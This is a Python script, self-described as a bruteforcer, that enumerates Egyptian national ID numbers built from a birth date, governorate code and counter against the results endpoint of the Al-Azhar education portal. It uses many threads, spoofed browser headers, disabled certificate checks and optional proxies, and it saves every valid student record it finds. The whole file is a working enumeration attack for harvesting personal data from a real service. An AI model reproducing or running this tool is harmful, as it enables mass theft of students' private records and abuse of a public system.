#!/usr/bin/env python3

import requests
import json
import time
import urllib3
import threading
import logging
from queue import Queue, Empty
import argparse
import signal
import sys
import os
from datetime import datetime
from threading import Lock

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Global progress tracking
progress_bar = None
stats_lock = Lock()
stats = {
    'processed': 0,
    'found': 0,
    'errors': 0,
    'start_time': None
}

url = "https://natiga.azhar.eg/WebService1.asmx/GetNatiga2nd"

# Proxy configuration will be set via command line arguments
proxy = None

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/json; charset=utf-8',
    'X-Requested-With': 'XMLHttpRequest',
    'Origin': 'https://natiga.azhar.eg',
    'Referer': 'https://natiga.azhar.eg/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Dnt': '1',
    'Sec-Gpc': '1',
    'Priority': 'u=0',
    'Te': 'trailers',
    'Connection': 'keep-alive'
}

def generate_item_id(base_value, bruted_value):
    idset = 30
    return f'{idset}{base_value}{bruted_value}'

def send_post_request(bruted_value, base_value, use_proxy=None, max_retries=20):
    item_id = generate_item_id(base_value, bruted_value)
    payload = json.dumps({'ItemId': item_id})
    
    retries = 0
    while retries < max_retries:
        try:
            # Use proxy if provided, otherwise make direct request
            if use_proxy:
                response = requests.post(url, headers=headers, data=payload, verify=False, proxies=use_proxy, timeout=(5, 15))
            else:
                response = requests.post(url, headers=headers, data=payload, verify=False, timeout=(5, 15))
            response.raise_for_status()
            return response
        except requests.exceptions.HTTPError as e:
            pass
        except requests.exceptions.ConnectionError as e:
            pass
        except requests.exceptions.Timeout as e:
            pass
        except requests.exceptions.RequestException as e:
            retries += 1
            time.sleep(1)
    
    return None

def worker(queue, lock, base_value, stop_event):
    while not stop_event.is_set() or not queue.empty():
        try:
            bruted_value = queue.get(timeout=0.1)
            item_id = generate_item_id(base_value, bruted_value)
            response = send_post_request(bruted_value, base_value, proxy)
            if response and response.status_code == 200:
                json_data = response.json()
                if json_data.get('d') is not None:
                    output_data = {
                        'item_id': item_id,
                        'response': json_data
                    }
                    with lock:
                        with open(output_file, 'a', encoding='utf-8') as file:
                            json.dump(output_data, file, ensure_ascii=False, indent=4)
                            file.write('\n')
                        print(f"[+] I FOUND VALID ID => {item_id}")
            queue.task_done()
        except Empty:
            continue

def ValidateDateOfBirth(value):
    ivalue = int(value)
    if len(value) != 5 or ivalue < 0:
        raise argparse.ArgumentTypeError(
            "Date of Birth (-dob) must be a 5-digit number like -dob 60101"
        )
    return ivalue

def ValidateGovId(value):
    """Validate governorate ID"""
    valid_gov_ids = ['12', '02', '03', '04', '11', '01', '13', '14', '15', '16', '17', '18', '19', '21', '23', '24', '25', '26', '27', '28', '29', '31', '32', '33', '34', '35', '88']
    if value not in valid_gov_ids:
        raise argparse.ArgumentTypeError(
            f"Invalid governorate ID '{value}'. Valid IDs are: {', '.join(valid_gov_ids)}"
        )
    return value

def get_governorate_name(gov_id):
    """Get governorate name from ID (for display purposes)"""
    gov_names = {
        '01': 'Cairo', '02': 'Alexandria', '03': 'Port Said', '04': 'Suez',
        '11': 'Damietta', '12': 'Dakahlia', '13': 'Sharqia', '14': 'Qalyubia',
        '15': 'Kafr el-Sheikh', '16': 'Gharbia', '17': 'Monufia', '18': 'Beheira',
        '19': 'Ismailia', '21': 'Giza', '23': 'Beni Suef', '24': 'Fayyum',
        '25': 'Minya', '26': 'Asyut', '27': 'Sohag', '28': 'Qena',
        '29': 'Aswan', '31': 'Luxor', '32': 'Red Sea', '33': 'New Valley',
        '34': 'Matrouh', '35': 'North Sinai', '88': 'South Sinai'
    }
    return gov_names.get(gov_id, f'Unknown ({gov_id})')

def generate_dates_for_month(year, month):
    """Generate all possible dates for a given year and month"""
    # Days in each month (non-leap year)
    days_in_month = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]
    
    # Check for leap year
    if month == 2 and ((year % 4 == 0 and year % 100 != 0) or (year % 400 == 0)):
        max_days = 29
    else:
        max_days = days_in_month[month - 1]
    
    dates = []
    year_digit = year % 10  # Get last digit of year
    
    for day in range(1, max_days + 1):
        date_str = f"{year_digit}{month:02d}{day:02d}"
        dates.append(int(date_str))
    
    return dates

def generate_dates_for_year(year):
    """Generate all possible dates for an entire year (all months and days)"""
    all_dates = []
    for month in range(1, 13):  # All 12 months
        month_dates = generate_dates_for_month(year, month)
        all_dates.extend(month_dates)
    return sorted(all_dates)

def display_startup_info(gov_ids, base_values, threads, output_file, total_requests, date_info, proxy_config):
    print("=" * 60)
    print("          AZ SCRAPER - AZHAR ID BRUTEFORCER")
    print("=" * 60)
    print(f"[*] Target Service: AZHAR Education Portal")
    print(f"[*] Company/Service URL: https://natiga.azhar.eg/")
    print(f"[*] API Endpoint: WebService1.asmx/GetNatiga2nd")
    print(f"[*] Start Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("-" * 60)
    print("CONFIGURATION:")
    print(f"[*] Date Strategy: {date_info}")
    if len(base_values) == 1:
        print(f"[*] Single Date (YMMDD): {base_values[0]}")
    else:
        print(f"[*] Date Range: {base_values[0]} to {base_values[-1]}")
        print(f"[*] Total Dates: {len(base_values):,}")
        
        # Show sample dates for large ranges
        if len(base_values) > 10:
            sample_dates = base_values[:5] + ['...'] + base_values[-5:]
            print(f"[*] Sample Dates: {', '.join(map(str, sample_dates))}")
    
    print(f"[*] Governorates: {', '.join([f'{gid}({get_governorate_name(gid)})' for gid in gov_ids])}")
    print(f"[*] Governorate Count: {len(gov_ids)}")
    print(f"[*] Threads: {threads}")
    print(f"[*] Output File: {output_file}")
    print(f"[*] Total Requests: {total_requests:,}")
    if len(base_values) > 1:
        print(f"[*] Requests per Date: {100000 * len(gov_ids):,}")
        print(f"[*] Requests per Governorate: {100000 * len(base_values):,}")
    print("-" * 60)
    print("PROXY CONFIGURATION:")
    if proxy_config:
        print(f"[*] HTTP Proxy: {proxy_config.get('http', 'Not set')}")
        print(f"[*] HTTPS Proxy: {proxy_config.get('https', 'Not set')}")
        print(f"[*] Proxy Status: ✅ ENABLED")
    else:
        print(f"[*] Proxy Status: ❌ DISABLED (Direct connection)")
        print(f"[*] Note: Use --proxy to enable proxy support")
    print("=" * 60)
    print("[+] Starting bruteforce attack...")
    print("=" * 60)

def signal_handler(signal, frame):
    print("\n[!] Bye")
    os._exit(1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SCRIPT TO BRUTEFORCE EG-ID IN AZHAR.")
    parser.add_argument('-dob', type=ValidateDateOfBirth, required=True, default='60101', help='date of Birth YMMDD like 20304 (-dob 20304)')
    parser.add_argument('-g', '--govid', type=ValidateGovId, help='Specific Gov ID to bruteforce (e.g., -g 12). If not specified, all gov IDs will be used.')
    parser.add_argument('-o', '--file', type=str, default='valid_responses.json', help='Output to save results.')
    parser.add_argument('-t', '--threads', type=int, default='50', help='Threads.')
    args = parser.parse_args()
    
    base_value = args.dob
    output_file = args.file
    
    # Determine which gov_ids to use
    all_gov_ids = ['12', '02', '03', '04', '11', '01', '13', '14', '15', '16', '17', '18', '19', '21', '23', '24', '25', '26', '27', '28', '29', '31', '32', '33', '34', '35', '88']
    
    if args.govid:
        gov_ids = [args.govid]
    else:
        gov_ids = all_gov_ids
    
    # Set up base_values as a single date
    base_values = [base_value]
    
    # Set up date info and proxy config
    date_info = f"Single date: {base_value}"
    proxy_config = None
    
    # Calculate total requests
    total_requests = len(base_values) * len(gov_ids) * 100000
    
    # Display startup information
    display_startup_info(gov_ids, base_values, args.threads, output_file, total_requests, date_info, proxy_config)
    
    queue = Queue()
    lock = threading.Lock()
    stop_event = threading.Event()

    num_threads = args.threads

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=worker, args=(queue, lock, base_value, stop_event))
        thread.start()
        threads.append(thread)

    signal.signal(signal.SIGINT, signal_handler)
    
    for prefix in gov_ids:
        for i in range(100000):
            bruted_value = f'{prefix}{i:05}'
            queue.put(bruted_value)

    queue.join()

    stop_event.set()
    for _ in range(num_threads):
        queue.put(None)
    for thread in threads:
        thread.join()

    print(f"[+] BRUTE FORCE COMPLETED => {output_file}")